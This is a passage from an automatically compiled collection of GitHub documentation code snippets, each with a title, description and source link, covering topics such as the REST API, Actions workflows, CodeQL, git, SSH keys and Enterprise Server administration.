fmt.Println(stdOut.String())\n}\n```\n\n----------------------------------------\n\nTITLE: Fetching issues with a map function and early termination\nDESCRIPTION: This code demonstrates using a map function with `octokit.paginate` to process each page's data and terminate pagination early based on a condition. It extracts the title and author of each issue, stopping when an issue with 'test' in the title is found. This reduces memory usage by only storing relevant data.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nconst issueData = await octokit.paginate(\"GET /repos/{owner}/{repo}/issues\", {\n  owner: \"github\",\n  repo: \"docs\",\n  per_page: 100,\n  headers: {\n    \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n  },\n}, (response, done) => response.data.map((issue) => {\n    if (issue.title.includes(\"test\")) {\n      done()\n    }\n    return ({title: issue.title, author: issue.user.login})\n  })\n);\n```\n\n----------------------------------------\n\nTITLE: Diagnosing Internet Connectivity Issues for Runners\nDESCRIPTION: This error code indicates that the GitHub-hosted runners are unable to establish outbound connections to GitHub and other necessary URLs for GitHub Actions. This typically occurs when the Azure resources are not correctly configured for internet access.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/azure-vnet-hosted-compute-troubleshooting.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nVNetInjectionFailedToConnectToInternet\n```\n\n----------------------------------------\n\nTITLE: Using the cancelled Status Check Function in GitHub Actions\nDESCRIPTION: This YAML snippet illustrates the use of the `cancelled()` function in an `if` conditional. The `cancelled()` function returns `true` if the workflow execution was manually cancelled by the user or system. This is useful for executing specific steps upon cancellation.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nif: {% raw %}${{ cancelled() }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Requesting Octocat using GitHub CLI\nDESCRIPTION: This command uses the GitHub CLI to make a GET request to the /octocat endpoint of the GitHub REST API. It retrieves the Octocat image. Ensure GitHub CLI is installed and authenticated.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/quickstart.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh api /octocat --method GET\n```\n\n----------------------------------------\n\nTITLE: Viewing Logs with journalctl\nDESCRIPTION: This command uses `journalctl` to view logs specifically tagged with 'nes'. It requires SSH access to the node where GHES is running and the systemd journal to be configured to collect 'nes' logs.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_16\n\nLANGUAGE: shell\nCODE:\n```\njournalctl -t nes\n```\n\n----------------------------------------\n\nTITLE: Commit Changes in Subversion\nDESCRIPTION: This example shows how to commit changes to a file within a Subversion working copy. It includes checking the status of modified files, adding new files, and committing the changes with a commit message. Requires an existing svn checkout.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/working-with-subversion-on-github/support-for-subversion-clients.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n$ svn status\n> M    gizmo.rb\n$ svn commit -m 'Guard against known problems'\n> Sending    more_awesome/gizmo.rb\n> Transmitting file data .\n> Committed revision 3.\n$ svn status\n> ?    test\n$ svn add test\n> A    test\n> A    test/gizmo_test.rb\n$ svn commit -m 'Test coverage for problems'\n> Adding    more_awesome/test\n> Adding    more_awesome/test/gizmo_test.rb\n> Transmitting file data .\n> Committed revision 4.\n```\n\n----------------------------------------\n\nTITLE: Complex Python Data Processing Function\nDESCRIPTION: This Python code defines a function `process_data` that performs data cleansing operations (stripping whitespace and converting price to float) and creates a Pandas DataFrame. The function handles multiple responsibilities, making it suitable for splitting into smaller, more focused functions.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/refactoring-code-with-github-copilot.md#_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nimport pandas as pd\nfrom pandas.io.formats.style import Styler\n\ndef process_data(item, price):\n    # Cleanse data\n    item = item.strip()  # Strip whitespace from item\n    price = price.strip()  # Strip whitespace from price\n    price = float(price) # Convert price to a float\n    # More cleansing operations here\n\n    # Create and print a DataFrame\n    data = {'Item': [item], 'Price': [price]}\n    df = pd.DataFrame(data)\n    print(df.to_string(index=False))\n\n# Example usage\nitem = \"   Apple \"\nprice = \" 1.25\"\nprocess_data(item, price)\n```\n\n----------------------------------------\n\nTITLE: Setting Failure Exit Code - Docker Container (Shell)\nDESCRIPTION: This shell script snippet demonstrates how to set a failure exit code in a Docker container action's `entrypoint.sh` script. If a specified condition is met, the script outputs a message and then exits with a non-zero exit code (in this case, 1), indicating failure. The exit code determines the status of the action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nif <condition> ; then\n  echo \"Game over!\"\n  exit 1\nfi\n```\n\n----------------------------------------\n\nTITLE: Create Directory\nDESCRIPTION: Creates a new directory named test and navigates into it.  This is done to create the parent repository for the subtree merge.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git-subtree-merges.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\nmkdir test\ncd test\n```\n\n----------------------------------------\n\nTITLE: POST request to exchange temporary code\nDESCRIPTION: This code snippet shows the HTTP POST request used to exchange the temporary code for the {% data variables.product.prodname_github_app %} configuration. Replace `{code}` with the actual code received in the redirect URL.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/sharing-github-apps/registering-a-github-app-from-a-manifest.md#_snippet_6\n\nLANGUAGE: HTTP\nCODE:\n```\nPOST /app-manifests/{code}/conversions\n```\n\n----------------------------------------\n\nTITLE: Launching an EC2 Instance using AWS CLI\nDESCRIPTION: This snippet shows how to launch an EC2 instance with a specified AMI, security group, instance type, and block device mapping using the AWS CLI. It uses the `aws ec2 run-instances` command. Replace `SECURITY_GROUP_ID`, `INSTANCE_TYPE`, `AMI_ID`, `SIZE`, `TYPE`, and `REGION` with your desired values. The block device mapping creates a new EBS volume that is attached to the instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-aws.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\naws ec2 run-instances \\\n  --security-group-ids SECURITY_GROUP_ID \\\n  --instance-type INSTANCE_TYPE \\\n  --image-id AMI_ID \\\n  --block-device-mappings '[{\"DeviceName\":\"/dev/xvdf\",\"Ebs\":{\"VolumeSize\":SIZE,\"VolumeType\":\"TYPE\"}}]' \\\n  --region REGION \\\n  --ebs-optimized\n```\n\n----------------------------------------\n\nTITLE: Markdown Table example\nDESCRIPTION: A complete markdown table example including languages used\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/quickstart-for-writing-on-github.md#_snippet_7\n\nLANGUAGE: markdown\nCODE:\n```\n## About me\n\nHi, I'm Mona. You might recognize me as {% data variables.product.prodname_dotcom %}'s mascot.\n\n| Rank | Languages |\n|-----:|-----------|\n|     1| JavaScript|\n|     2| Python    |\n|     3| SQL       |\n```\n\n----------------------------------------\n\nTITLE: Run OpenAPI Sync Script (Shell)\nDESCRIPTION: Runs the `sync-rest` script to update the OpenAPI data in the `github/docs-internal` repository using data from the `rest-api-description` repository.  Requires `npm` and a properly configured local environment. The `GITHUB_TOKEN` environment variable warning can be ignored.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/lib/release-templates/release-steps-5.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nnpm run sync-rest -- --source-repo rest-api-description --output rest github-apps webhooks rest-redirects\n```\n\n----------------------------------------\n\nTITLE: Generating Compatible SSH Keypair for Bitbucket Server Migration\nDESCRIPTION: This command generates a new SSH keypair using the ed25519 algorithm and the aes256-cbc cipher, which is supported by GitHub Enterprise Importer when migrating from Bitbucket Server. The keypair is created with a comment identifying the user's email address. This is needed if the existing key is using an unsupported cipher.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/completing-your-migration-with-github-enterprise-importer/troubleshooting-your-migration-with-github-enterprise-importer.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nssh-keygen -t ed25519 -Z aes256-cbc -C \"your_email@example.com\"\n```\n\n----------------------------------------\n\nTITLE: Read Tree for Subtree\nDESCRIPTION: Reads the tree from the specified remote branch into the local repository with the given prefix (subdirectory). The '-u' option updates the index after reading the tree.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git-subtree-merges.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngit read-tree --prefix=spoon-knife/ -u spoon-knife/main\n```\n\n----------------------------------------\n\nTITLE: Defining BankAccount Class in Python\nDESCRIPTION: This code defines a `BankAccount` class with methods for depositing, withdrawing, and getting the balance. It includes validation to prevent negative initial balances or amounts, and withdrawals exceeding the current balance.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/writing-tests-with-github-copilot.md#_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\nclass BankAccount:\n    def __init__(self, initial_balance=0):\n        if initial_balance < 0:\n            raise ValueError(\"Initial balance cannot be negative.\")\n        self.balance = initial_balance\n\n    def deposit(self, amount):\n        if amount <= 0:\n            raise ValueError(\"Deposit amount must be positive.\")\n        self.balance += amount\n\n    def withdraw(self, amount):\n        if amount <= 0:\n            raise ValueError(\"Withdrawal amount must be positive.\")\n        if amount > self.balance:\n            raise ValueError(\"Cannot withdraw more than the current balance.\")\n        self.balance -= amount\n\n    def get_balance(self):\n        return self.balance\n```\n\n----------------------------------------\n\nTITLE: Handling Specific Error Codes in Octokit\nDESCRIPTION: This snippet demonstrates how to handle specific HTTP status codes returned by the GitHub API, particularly when those codes represent non-error responses.  It specifically handles a 404 Not Found error when checking if a repository is starred.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nbegin\noctokit.request(\"GET /user/starred/{owner}/{repo}\", owner: \"github\", repo: \"docs\")\nputs \"The repository is starred by me\"\nrescue Octokit::NotFound => error\nputs \"The repository is not starred by me\"\nrescue Octokit::Error => error\nputs \"An error occurred while checking if the repository is starred: #{error&.response&.data&.message}\"\nend\n```\n\n----------------------------------------\n\nTITLE: Defining the Root Route in Ruby\nDESCRIPTION: This snippet defines the root route (\"/\") of the Sinatra application, which displays a link to prompt users to authenticate with GitHub.  The link redirects the user to the GitHub authorization page, including the client ID as a parameter. When the user authorizes the app, GitHub redirects them back to the callback URL.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-login-with-github-button-with-a-github-app.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/\" do\n  link = '<a href=\"{% data variables.product.oauth_host_code %}/login/oauth/authorize?client_id=<%= CLIENT_ID %>\">Login with GitHub</a>'\n  erb link\nend\n```\n\n----------------------------------------\n\nTITLE: Workflow Run Trigger on Specific Branch Pattern (YAML)\nDESCRIPTION: This snippet configures a workflow to trigger when another workflow named 'Build' runs on a branch whose name starts with 'releases/'. The `on.workflow_run` section specifies the triggering workflow and the event types to listen for (requested). The `branches` filter uses a glob pattern 'releases/**' to match branches starting with 'releases/'.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/section-specifying-branches.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_run:\n    workflows: [\"Build\"]\n    types: [requested]\n    branches:\n      - 'releases/**'\n```\n\n----------------------------------------\n\nTITLE: Searching Audit Log with REST API\nDESCRIPTION: This shell command uses `curl` to search an organization's audit log for events associated with a specific token. It requires a valid `YOUR-TOKEN` for authentication and specifies the organization's name (`octo-org`) and the URI-encoded SHA-256 hash of the token in the request.\nSOURCE: https://github.com/github/docs/blob/main/content/organizations/keeping-your-organization-secure/managing-security-settings-for-your-organization/identifying-audit-log-events-performed-by-an-access-token.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncurl --header \"Accept: application/vnd.github+json\" --header \"Authorization: Bearer YOUR-TOKEN\" {% data reusables.rest-api.version-header %} 'https://api.github.com/orgs/octo-org/audit-log?phrase=hashed_token:\"EH4L8o6PfCqipALbL%2BQT62lyqUtnI7ql0SPbkaQnjv8\"'\n```\n\n----------------------------------------\n\nTITLE: Disabling TLS Certificate Verification - Shell\nDESCRIPTION: This shell script disables TLS certificate verification by setting the `GITHUB_ACTIONS_RUNNER_TLS_NO_VERIFY` environment variable to `1`. This is followed by running the `config.sh` script to configure the runner, providing the URL and token, and finally starting the runner with `run.sh`. This is intended for testing purposes on Linux and macOS environments.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nexport GITHUB_ACTIONS_RUNNER_TLS_NO_VERIFY=1\n./config.sh --url https://github.com/YOUR-ORG/YOUR-REPO --token\n./run.sh\n```\n\n----------------------------------------\n\nTITLE: Git Cloning with Nonexistent Ref Warning\nDESCRIPTION: Illustrates the warning message received when cloning a repository where the remote HEAD refers to a nonexistent ref. This typically occurs when the default branch of the repository has been deleted on the remote.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/troubleshooting-cloning-errors.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\n$ git clone https://{% data variables.product.product_url %}/USER/REPO.git\n# Clone a repo\n> Cloning into 'repo'...\n> remote: Counting objects: 66179, done.\n> remote: Compressing objects: 100% (15587/15587), done.\n> remote: Total 66179 (delta 46985), reused 65596 (delta 46402)\n> Receiving objects: 100% (66179/66179), 51.66 MiB | 667 KiB/s, done.\n> Resolving deltas: 100% (46985/46985), done.\n> warning: remote HEAD refers to nonexistent ref, unable to checkout.\n```\n\n----------------------------------------\n\nTITLE: Configuring Self-Hosted Runners (JSON Example)\nDESCRIPTION: This JSON snippet demonstrates how to define the labels for a self-hosted runner in GitHub Actions using the `MRVA_RUNNER_OS` repository variable.  The labels specify the characteristics of the runner, such as operating system and architecture. This variable is crucial for directing variant analysis jobs to the appropriate self-hosted runner.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-for-vs-code/getting-started-with-codeql-for-vs-code/running-codeql-queries-at-scale-with-multi-repository-variant-analysis.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n[\"self-hosted\", \"macOS\", \"ARM64\"]\n```\n\n----------------------------------------\n\nTITLE: Updating devcontainer.json with port labels\nDESCRIPTION: This JSON snippet demonstrates how to configure port labels within the `portsAttributes` section of a `devcontainer.json` file.  This allows for automatic labeling of forwarded ports when a codespace is created from the repository using the configuration. It sets labels for ports 3333 and 4444.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/codespaces/port-forwarding-labeling.md#_snippet_0\n\nLANGUAGE: jsonc\nCODE:\n```\n// Use 'forwardPorts' to make a list of ports inside the container available locally.\n   \"forwardPorts\": [3333, 4444],\n\n   \"portsAttributes\": {\n     \"3333\": {\n       \"label\": \"app-standard-preview\"\n     },\n     \"4444\": {\n       \"label\": \"app-pro-preview\"\n     }\n   }\n```\n\n----------------------------------------\n\nTITLE: Configuring Title and Description in _config.yml\nDESCRIPTION: This code snippet demonstrates how to configure the title and description of a GitHub Pages site by adding the `title` and `description` fields to the `_config.yml` file. The `theme` field is also present, which specifies the Jekyll theme used for the site. No specific dependencies are required, but a Jekyll environment is assumed.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/quickstart.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ntheme: jekyll-theme-minimal\ntitle: Octocat's homepage\ndescription: Bookmark this to keep an eye on my project updates!\n```\n\n----------------------------------------\n\nTITLE: Complex conditional rendering with else if\nDESCRIPTION: This snippet uses a complex conditional rendering structure to display different content based on GHES versions. If the GHES version is less than 2.14, 'Alpha' is displayed. If the GHES version is not less than 2.14, it then checks if the GHES version is greater than 2.16.  If true, it renders Charlie, else renders Delta. Finally it displays Echo.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/less-than-next-oldest.md#_snippet_7\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes < 2.14 %}\n\nAlpha\n\n{% else %}\n\nBravo\n\n{% ifversion ghes > 2.16 %}\n\nCharlie\n\n{% else %}\n\nDelta\n\n{% endif %}\n\nEcho\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Checking for SSH Keys and Agent Status\nDESCRIPTION: This snippet checks if any SSH keys are loaded into the SSH agent. It's crucial to ensure keys are loaded before attempting SSH connections to avoid permission denied errors. The output displays the fingerprint and path of any loaded SSH keys.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-permission-denied-publickey.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n# start the ssh-agent in the background\n$ eval \"$(ssh-agent -s)\"\n> Agent pid 59566\n$ ssh-add -l -E sha256\n> 2048 SHA256:274ffWxgaxq/tSINAykStUL7XWyRNcRTlcST1Ei7gBQ /Users/USERNAME/.ssh/id_rsa (RSA)\n```\n\n----------------------------------------\n\nTITLE: Compile or check QL code using codeql query compile\nDESCRIPTION: Compiles or checks QL code by running the `codeql query compile` command with specified options and input files. The primary purpose is to optimize and store a compiled version of the query in a compilation cache. Supports options for checking validity, precompiling, dumping intermediate representations, and managing resources like threads and memory.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/query-compile.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql query compile [--check-only] [--keep-going] [--threads=<num>] [--ram=<MB>] <options>... -- <file>...\n```\n\n----------------------------------------\n\nTITLE: Setting X-GitHub-Api-Version HTTP Header - Shell\nDESCRIPTION: This snippet demonstrates how to set the `X-GitHub-Api-Version` HTTP header using a command-line tool like `curl` or `wget`. The header value is dynamically set using a variable `allVersions[currentVersion].latestApiVersion`, implying this value is fetched from a configuration or data source.  This is crucial for interacting with specific versions of the GitHub API and ensuring compatibility.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/rest-api/version-header.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n--header \"X-GitHub-Api-Version:{{ allVersions[currentVersion].latestApiVersion }}\"\n```\n\n----------------------------------------\n\nTITLE: Object Filters Example - JSON Object\nDESCRIPTION: This JSON snippet provides an example of a JSON object named `vegetables` with nested objects. Each nested object contains `colors` and `ediblePortions` arrays, and it exemplifies data that could be filtered using `vegetables.*.ediblePortions`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions.md#_snippet_12\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"scallions\":\n  {\n    \"colors\": [\"green\", \"white\", \"red\"],\n    \"ediblePortions\": [\"roots\", \"stalks\"],\n  },\n  \"beets\":\n  {\n    \"colors\": [\"purple\", \"red\", \"gold\", \"white\", \"pink\"],\n    \"ediblePortions\": [\"roots\", \"stems\", \"leaves\"],\n  },\n  \"artichokes\":\n  {\n    \"colors\": [\"green\", \"purple\", \"red\", \"black\"],\n    \"ediblePortions\": [\"hearts\", \"stems\", \"leaves\"],\n  },\n}\n```\n\n----------------------------------------\n\nTITLE: Patching `ghe-repl-promote` Script with `sed`\nDESCRIPTION: This command modifies the `ghe-repl-promote` script in place using `sed` to prevent it from attempting to decommission Elasticsearch nodes on the unreachable original primary node when the `forced` flag is not set. It adds a conditional statement to the script to skip the decommissioning process if the forced flag isn't set.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/release-notes/2024-11-ghe-repl-promote-primary-down.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nsudo sed -i.bak -e '/for node_hostname in/i if ! $forced; then' -e '/^  done/a fi' /usr/local/bin/ghe-repl-promote\n```\n\n----------------------------------------\n\nTITLE: Filtering Queries by ID (Separate Exclude Instructions) - YAML\nDESCRIPTION: This example shows an alternative way to exclude queries based on their IDs, using a separate `exclude` instruction for each query. The queries `cpp/cleartext-transmission` and `cpp/cleartext-storage-file` are individually excluded from the `codeql/cpp-queries` suite. This is functionally equivalent to the previous example.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\n- qlpack: codeql/cpp-queries\n- exclude:\n    id: cpp/cleartext-transmission\n- exclude:\n    id: cpp/cleartext-storage-file\n```\n\n----------------------------------------\n\nTITLE: Basic TypeScript Example\nDESCRIPTION: This TypeScript snippet demonstrates a simple \"Hello, World!\" program and a greet function. It uses console.log to print messages and includes a type annotation for the function's parameter. The snippet also declares a constant string variable and calls the greet function with it.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/foo/autotitling.md#_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\n// This is a code sample\nconsole.log(\"Hello, World!\");\n\n// for more info on this, visit [AUTOTITLE](/get-started/markdown).\nfunction greet(name: string): void {\n  console.log(`Hello, ${name}!`);\n}\n\n// another example is [AUTOTITLE](/get-started/markdown/alerts)\nconst userName: string = \"TypeScript User\";\ngreet(userName);\n```\n\n----------------------------------------\n\nTITLE: Concurrency with Fallback Value\nDESCRIPTION: This YAML snippet demonstrates how to use a fallback value when defining the concurrency group. It attempts to use `github.head_ref` (which is only defined for pull requests) and falls back to `github.run_id` if `github.head_ref` is undefined.  This prevents errors when the workflow is triggered by events other than pull requests.  `cancel-in-progress` is set to `true`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/actions-group-concurrency.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nconcurrency:\n  group: ${{ github.head_ref || github.run_id }}\n  cancel-in-progress: true\n```\n\n----------------------------------------\n\nTITLE: Authenticating as an installation with Octokit\nDESCRIPTION: This Ruby code snippet shows how to authenticate as an installation of a GitHub App using an installation access token. It retrieves the installation ID from the webhook payload and uses the `create_app_installation_access_token` method to generate a token.  It then initializes an Octokit client using this token. It depends on the `Octokit` library.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\n# Instantiate an Octokit client authenticated as an installation of a\n# GitHub App to run API operations.\ndef authenticate_installation(payload)\n  installation_id = payload['installation']['id']\n  installation_token = @app_client.create_app_installation_access_token(installation_id)[:token]\n  @installation_client = Octokit::Client.new(bearer_token: installation_token)\nend\n```\n\n----------------------------------------\n\nTITLE: Requesting User GitHub Identity via GET - OAuth\nDESCRIPTION: This code snippet shows how to request a user's GitHub identity using a GET request to the `/login/oauth/authorize` endpoint. It is a crucial first step in the web application flow for OAuth authorization. The parameters such as `client_id`, `redirect_uri`, `scope`, and `state` are essential for identifying the application and managing the authorization process.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_0\n\nLANGUAGE: HTTP\nCODE:\n```\nGET {% data variables.product.oauth_host_code %}/login/oauth/authorize\n```\n\n----------------------------------------\n\nTITLE: Including Imported Queries (Specific Syntax) - YAML\nDESCRIPTION: This example demonstrates a specific syntax required for including imported queries. An empty `exclude` instruction is necessary before the `include` instruction to ensure that the subsequent `include` instruction can properly filter queries from the imported suite. This example includes only `very-high` and `high` precision queries from the imported suite.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_19\n\nLANGUAGE: yaml\nCODE:\n```\n- import: codeql-suites/cpp-security-and-quality.qls\n  from: codeql/cpp-queries\n- exclude: {}\n- include:\n    precision:\n      - very-high\n      - high\n```\n\n----------------------------------------\n\nTITLE: Defining Multiple Manifest Locations - YAML\nDESCRIPTION: This code snippet demonstrates how to specify multiple locations for manifest files in a `dependabot.yml` file using the `directories` option. It defines two update schedules for manifest files stored in different directories for Bundler.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/controlling-dependencies-updated.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Specify the locations of the manifest files to update for each package manager\n# using both `directories` and `directory`\n\nversion: 2\nupdates:\n  - package-ecosystem: \"bundler\"\n    # Update manifest files stored in these directories weekly\n    directories:\n      - \"/frontend\"\n      - \"/backend\"\n      - \"/admin\"\n    schedule:\n      interval: \"weekly\"\n  - package-ecosystem: \"bundler\"\n    # Update manifest files stored in the root directory daily\n    directory: \"/\"\n    schedule:\n      interval: \"daily\"\n```\n\n----------------------------------------\n\nTITLE: Adding AppRoles object to Manifest - Entra ID - JSON\nDESCRIPTION: This code snippet shows the JSON block that needs to be added to the `appRoles` object in the Manifest file of the Enterprise Managed Users application in the Microsoft Azure portal. This addition enables the 'Guest Collaborator' role for Entra ID.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-users-in-your-enterprise/enabling-guest-collaborators.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"allowedMemberTypes\": [\n    \"User\"\n  ],\n  \"description\": \"Guest Collaborator\",\n  \"displayName\": \"Guest Collaborator\",\n  \"id\": \"1ebc4a02-e56c-43a6-92a5-02ee09b90824\",\n  \"isEnabled\": true,\n  \"lang\": null,\n  \"origin\": \"Application\",\n  \"value\": null\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Tracking Issue via API using Task List Syntax\nDESCRIPTION: This snippet demonstrates the required markdown syntax for creating a code scanning alert tracking issue via the GitHub API.  The issue body must contain a task list item with the full URL to the code scanning alert to establish the tracked relationship.  Only users with write permissions will see the unfurled URL.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/managing-code-scanning-alerts/tracking-code-scanning-alerts-in-issues-using-task-lists.md#_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\n- [ ] FULL-URL-TO-THE-CODE-SCANNING-ALERT\n```\n\n----------------------------------------\n\nTITLE: Configuring Extension Packs in VS Code settings.json\nDESCRIPTION: These JSON snippets demonstrate how to configure the \"codeQL.runningQueries.useExtensionPacks\" setting in VS Code's settings.json file. This setting controls whether CodeQL queries will utilize model packs stored in the `.github/codeql/extensions` directory of the workspace. Two options are showcased: one to enable all extension packs, and another to disable them.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-for-vs-code/using-the-advanced-functionality-of-the-codeql-for-vs-code-extension/using-the-codeql-model-editor.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n\"codeQL.runningQueries.useExtensionPacks\": \"all\",\n```\n\nLANGUAGE: json\nCODE:\n```\n\"codeQL.runningQueries.useExtensionPacks\": \"none\",\n```\n\n----------------------------------------\n\nTITLE: CodeQL Library Pack Configuration\nDESCRIPTION: This YAML snippet shows a `qlpack.yml` file for a CodeQL library pack. It defines the pack's name, specifies that it's a library pack, and sets its version to 1.0.0. The `name` field is the fully qualified name of the pack.  The `library` field indicates that this pack contains library code that can be used by other packs.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/about-codeql-workspaces.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: my-company/my-library\nlibrary: true\nversion: 1.0.0\n```\n\n----------------------------------------\n\nTITLE: Add Users to Cost Center using REST API\nDESCRIPTION: This snippet refers to the GitHub REST API endpoint for adding users to a cost center. It highlights the requirement to use the API for assigning users to cost centers, which is necessary for tracking their specific GitHub Copilot usage and allocating costs accurately. This is a crucial step in mapping spending to user groups for accurate cost allocation.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/rolling-out-github-copilot-at-scale/managing-your-companys-spending-on-github-copilot.md#_snippet_0\n\nLANGUAGE: REST\nCODE:\n```\n[AUTOTITLE](/enterprise-cloud@latest/rest/enterprise-admin/billing#add-users-to-a-cost-center)\n```\n\n----------------------------------------\n\nTITLE: Deleting Package Version with GraphQL\nDESCRIPTION: This snippet demonstrates how to delete a package version using the `deletePackageVersion` mutation in the GraphQL API. It requires a {% data variables.product.pat_v1 %} with the `read:packages`, `delete:packages`, and `repo` scopes.  The `packageVersionId` is required to identify the specific version to delete.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/learn-github-packages/deleting-and-restoring-a-package.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl -X POST \\\n-H \"Accept: application/vnd.github.package-deletes-preview+json\" \\\n-H \"Authorization: bearer TOKEN\" \\\n-d '{\"query\":\"mutation { deletePackageVersion(input:{packageVersionId:\\\"MDIyOlJlZ2lzdHJ5UGFja2FnZVZlcnNpb243MTExNg==\\\"}) { success }}\"}' \\\nHOSTNAME/graphql\n```\n\n----------------------------------------\n\nTITLE: Marking files as generated using linguist-generated in .gitattributes\nDESCRIPTION: This snippet shows how to use the `linguist-generated` attribute in a `.gitattributes` file to mark `search/index.json` as a generated file.  This will exclude it from the repository's language statistics and hide it in diffs by default. The `.gitattributes` file uses the same pattern matching rules as `.gitignore`.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-files/customizing-how-changed-files-appear-on-github.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nsearch/index.json linguist-generated=true\n```\n\n----------------------------------------\n\nTITLE: Using Third-Party GitHub Action with SHA in 